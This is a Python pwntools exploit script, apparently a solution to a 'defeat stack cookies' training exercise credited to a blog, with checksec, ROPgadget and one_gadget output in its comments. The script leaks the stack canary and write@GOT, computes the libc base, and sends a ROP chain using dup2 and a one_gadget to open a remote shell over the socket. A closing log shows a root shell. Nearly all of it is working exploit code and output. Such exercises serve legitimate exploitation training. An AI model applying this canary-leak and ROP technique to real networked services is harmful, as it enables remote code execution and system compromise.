#!/usr/bin/env python

"""

This is a version of the exploit to solve this exercise:
- https://made0x78.com/bseries-defeat-stack-cookies/ here you will find his explaination and the source code of this challenge.

Thanks to @made0x78.


Canary                        : Yes
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : Partial

0000000000400730 <recv@plt>:
0000000000400740 <write@plt>:
0000000000400750 <strlen@plt>:
0000000000400760 <__stack_chk_fail@plt>:
0000000000400770 <htons@plt>:
0000000000400780 <send@plt>:
0000000000400790 <close@plt>:
00000000004007a0 <listen@plt>:
00000000004007b0 <bind@plt>:
00000000004007c0 <perror@plt>:
00000000004007d0 <bzero@plt>:
00000000004007e0 <accept@plt>:
00000000004007f0 <exit@plt>:
0000000000400800 <fork@plt>:
0000000000400810 <socket@plt>:


ROPgadget --binary cookies  | grep 'pop rdi ; ret'
    0x0000000000400b83 : pop rdi ; ret
ROPgadget --binary cookies | grep 'pop rsi ;'
    0x0000000000400b81 : pop rsi ; pop r15 ; ret


one_gadget /lib/x86_64-linux-gnu/libc.so.6
0xc84da execve("/bin/sh", r12, r13)
constraints:
  [r12] == NULL || r12 == NULL
  [r13] == NULL || r13 == NULL

0xc84dd execve("/bin/sh", r12, rdx)
constraints:
  [r12] == NULL || r12 == NULL
  [rdx] == NULL || rdx == NULL

0xc84e0 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

0xe664b execve("/bin/sh", rsp+0x60, environ)
constraints:
  [rsp+0x60] == NULL

"""

from pwn import *

HOST = "127.0.0.1"
PORT = 1234

def function_leak(host, port, junk, canary, rdi, rsi, got, plt):
	io = remote(host, port)
	io.clean()
	payload = junk + canary + ("B" * 8) + rdi + p64(0x4) + rsi + got + ("A" * 8) + plt
	io.sendline(payload)
	io.recvuntil(junk)
	write = io.recv(8)
	io.close()
	return write

def canary_leak(host, port, junk):
	io = remote(host, port)
	io.clean()
	io.sendline(junk)
	io.recvuntil(junk)
	canary = io.recv(8)
	canary = u64(canary) - 0xa
	io.recv()
	io.close()
	return p64(canary)

pop_rdi = p64(0x400b83)
pop_rsi_r15 = p64(0x400b81)
write_got = p64(0x601020)
write_plt = p64(0x400740)


junk = "A" * 1032

# First stage: canary leakage

canary = canary_leak(HOST, PORT, junk)
log.success("canary: {}".format(hex(u64(canary))))

# Second stage: write@got leakage

write_leaked = function_leak(HOST, PORT, junk, canary, pop_rdi, pop_rsi_r15, write_got, write_plt)
log.success("write address {}".format(hex(u64(write_leaked))))

# Getting the libc_base_address

write_libc = 0xeb8f0
libc_base_address = u64(write_leaked) - write_libc
log.success("libc base address: {}".format(hex(libc_base_address)))


# Third stage: popping shell...

dup2 = p64(libc_base_address + 0xec020)
one_gadget = p64(libc_base_address + 0xe664b)

log.success("dup2 address: {}".format(hex(u64(dup2))))
log.success("onegadget address: {}".format(hex(u64(one_gadget))))

payload = junk
payload += canary
payload += "B" * 8
payload += pop_rdi
payload += p64(0x4) # fd = 4 -> socket
payload += (pop_rsi_r15)
payload += p64(0x0)
payload += "A" * 8
payload += dup2
payload += pop_rdi
payload += p64(0x4)
payload += pop_rsi_r15
payload += p64(0x1)
payload += "A" * 8
payload += dup2
payload += one_gadget # execve("/bin/sh") if [rsp+0x60] == NULL
payload += "\x00" * 120 #trigger one_gadget constraint


io = remote(HOST, PORT)
io.clean()
io.sendline(payload)
io.clean()
io.interactive()

"""

root@kali:~/Scrivania/binaries/cookies# ./exploit.py 
[+] Opening connection to 127.0.0.1 on port 1234: Done
[*] Closed connection to 127.0.0.1 port 1234
[+] canary: 0xf9441add86d90c00
[+] Opening connection to 127.0.0.1 on port 1234: Done
[*] Closed connection to 127.0.0.1 port 1234
[+] write address 0x7fa82b4d98f0
[+] libc base address: 0x7fa82b3ee000
[+] dup2 address: 0x7fa82b4da020
[+] onegadget address: 0x7fa82b4d464b
[+] Opening connection to 127.0.0.1 on port 1234: Done
[*] Switching to interactive mode
$ whoami
root

"""